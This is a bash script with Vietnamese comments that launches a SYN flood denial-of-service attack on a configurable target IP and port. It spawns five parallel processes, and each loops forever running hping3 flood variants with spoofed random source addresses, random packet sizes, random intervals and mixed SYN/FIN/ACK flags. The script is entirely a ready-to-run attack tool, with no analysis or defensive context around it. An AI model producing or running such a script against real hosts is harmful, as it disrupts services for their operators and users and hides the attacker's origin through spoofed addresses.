#!/bin/bash

# IP và cổng đích (chỉnh sửa nếu cần)
TARGET_IP="192.168.1.100"
TARGET_PORT=80

# Số tiến trình tấn công song song
NUM_PROCESSES=5

echo "[+] Đang bắt đầu tấn công SYN Flood với biến động cao..."

# Hàm thực hiện tấn công
attack() {
    while true; do
        # Chọn ngẫu nhiên kiểu tấn công
        ATTACK_TYPE=$((RANDOM % 4))
        
        case $ATTACK_TYPE in
            0)
                echo "[+] SYN Flood với IP giả mạo"
                hping3 -S --flood --rand-source -p $TARGET_PORT $TARGET_IP
                ;;
            1)
                PACKET_SIZE=$((RANDOM % 100 + 20)) # Kích thước ngẫu nhiên 20-120 bytes
                echo "[+] SYN Flood với kích thước gói tin $PACKET_SIZE bytes"
                hping3 -S --flood --rand-source -p $TARGET_PORT --data $PACKET_SIZE $TARGET_IP
                ;;
            2)
                INTERVAL=$((RANDOM % 500 + 50)) # Khoảng thời gian giữa gói (50-550 micro giây)
                echo "[+] SYN Flood với thời gian giữa gói ngẫu nhiên $INTERVAL us"
                hping3 -S --flood --rand-source -p $TARGET_PORT -i u$INTERVAL $TARGET_IP
                ;;
            3)
                echo "[+] Tấn công hỗn hợp SYN + FIN + ACK"
                hping3 -S -A -F --flood --rand-source -p $TARGET_PORT $TARGET_IP
                ;;
        esac
        sleep 1
    done
}

# Chạy nhiều tiến trình song song để tạo luồng dữ liệu đa dạng
for i in $(seq 1 $NUM_PROCESSES); do
    attack &
done

# Chờ tiến trình hoàn tất
wait

